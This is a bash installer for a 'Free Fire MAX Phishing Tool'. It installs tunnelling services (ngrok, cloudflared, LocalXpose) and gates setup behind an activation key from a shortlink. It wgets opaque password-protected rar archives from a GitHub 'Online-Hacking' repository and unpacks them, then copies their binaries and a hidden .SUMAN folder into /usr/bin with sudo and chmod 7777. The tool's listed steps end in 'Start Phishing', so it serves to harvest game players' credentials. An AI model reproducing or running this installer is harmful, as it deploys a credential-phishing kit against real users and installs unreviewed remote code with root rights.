#!/bin/bash
echo ""
sudo rm -rf FreeFire-Phishing
sudo wget -q https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/Files/Linux/FreeFire-Phishing > /dev/null
clear
echo ""

logo() {
echo -e ""
echo -e "\e[33m
███████ ██████  ███████ ███████ 
██      ██   ██ ██      ██      
█████   ██████  █████   █████   
██      ██   ██ ██      ██      
██      ██   ██ ███████ ███████                                 
                                
      ███████ ██ ██████  ███████      
      ██      ██ ██   ██ ██           
      █████   ██ ██████  █████        
      ██      ██ ██   ██ ██           
      ██      ██ ██   ██ ███████      
                                       
  \e[0m\n"
}

logo2() {
echo -e ""
echo -e "\e[92m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""
  
  }
  

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		else
			cp -f $file > /dev/null 2>&1
		fi
		chmod +x $output $file > /dev/null 2>&1
		rm -rf file1
	else
		echo -e "\e[91m Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}


install_ngrok() {
	if [[ -e "ngrok" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Ngrok already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Ngrok..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}


install_cloudflared() {
	if [[ -e "cloudflared" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Cloudflared already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Cloudflared..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e "loclx" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}


ngroktoken() {
echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mAuth Token ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
./ngrok config add-authtoken $token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi
}


uninstall() {
echo -e ""
sudo rm -rf /usr/bin/ngrok
sudo rm -rf /usr/bin/cloudflared
sudo rm -rf /usr/bin/loclx
sudo rm -rf /usr/bin/.SUMAN/1 /usr/bin/.SUMAN/2 /usr/bin/.SUMAN/3 /usr/bin/.SUMAN/4 /usr/bin/.SUMAN/5 /usr/bin/.SUMAN/6 /usr/bin/.SUMAN/7 /usr/bin/.SUMAN/8 /usr/bin/.SUMAN/9 /usr/bin/.SUMAN/0
sudo rm -rf /usr/bin/FF
sudo rm -rf /usr/bin/FreeFire
sudo rm -rf /usr/bin/FreeFire-Phishing
sudo rm -rf /usr/bin/OnlineHacking
echo -e ""
}

welcome() {
echo -e ""
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install successfully \e[0m"
echo ""
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Setup Tool Installation Video  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
sleep 5
clear
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m If You are not Understand. Play Installation Video \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
echo""
echo""
echo ""
echo ""
clear
}

echo ""
clear
welcome
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e "\e[33m
      ██╗  ██╗███████╗██╗   ██╗
      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
      █████╔╝ █████╗   ╚████╔╝
      ██╔═██╗ ██╔══╝    ╚██╔╝
      ██║  ██╗███████╗   ██║
      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[92m Activation Key 100% Free. Dont Buy  \e[34m( \e[1;36mplay video tutorial \e[34m) \e[0m"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Generate Key and Copy Key \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/Free-Fire-Key  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m\e[97m' option
echo""
echo""
echo""
if [[ $option == *'1abcbefa8d46c2487786a4d9d45a'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
echo ""
sudo apt autoremove -y
sudo apt install php -y
sudo apt install tail -y
sudo apt install curl -y
sudo apt install unrar -y
sudo apt-get install unrar-free -y
sudo apt install unzip -y
sudo apt install ruby -y
sudo gem install lolcat
sudo apt install wget -y
sudo apt install ssh -y 
sudo apt install jq -y
clear
echo""
logo2
echo""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
install_ngrok
rm -rf ngrok-v3*.tgz
echo ""
install_cloudflared
mv cloudflared-li* cloudflared
echo ""
install_localxpose
rm -rf  loclx-linux*
echo ""
chmod +x loclx loclx*
chmod +x cloudflared ngrok
sleep 1
echo""
clear
echo ""
logo
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar -O SUMAN.rar
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN-MAX.rar -O SUMAN-MAX.rar
unrar x -Password SUMAN.rar
unrar x -Password SUMAN-MAX.rar
rm -rf SUMAN.rar
rm -rf SUMAN-MAX.rar
chmod +x ngrok
chmod +x cloudflared
chmod +x FF
chmod +x FreeFire
clear

ngroktoken

echo
sudo cp -R cloudflared ngrok loclx .SUMAN/1/
sudo cp -R cloudflared ngrok loclx .SUMAN/2/
sudo cp -R cloudflared ngrok loclx .SUMAN/3/
sudo cp -R cloudflared ngrok loclx .SUMAN/4/
sudo cp -R cloudflared ngrok loclx .SUMAN/5/
sudo cp -R cloudflared ngrok loclx .SUMAN/6/
sudo cp -R cloudflared ngrok loclx .SUMAN/7/
sudo cp -R cloudflared ngrok loclx .SUMAN/8/
sudo cp -R cloudflared ngrok loclx .SUMAN/9/
sudo cp -R cloudflared ngrok loclx .SUMAN/0/
sudo chmod 7777 FreeFire-Phishing
clear
echo
uninstall
echo
sudo cp -R ngrok /usr/bin/
sudo cp -R cloudflared /usr/bin/
sudo cp -R loclx /usr/bin/
sudo cp -R .SUMAN /usr/bin/
sudo cp -R FF /usr/bin/
sudo cp -R FreeFire /usr/bin/
sudo cp -R FreeFire-Phishing /usr/bin/
sudo cp -R OnlineHacking /usr/bin/
clear
echo
logo
echo
echo -e "\e[35m[+] Connect Online Hacking FREE FIRE Hacking Server (CyberPlane)......  \e[m "
sleep 5
echo
echo
clear
logo2
echo
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 2
echo
echo -e "\e[1m \e[36m[+] There Free Fire Max Phishing Tool Ready \e[m \e[21"
echo
echo
echo -e "\e[92m[+] Now Type This Command:\e[93m FreeFire-Phishing \e[m "
echo
fi

echo
rm -rf .Linux-Setup.sh .SUMAN
sleep 2
echo
exit
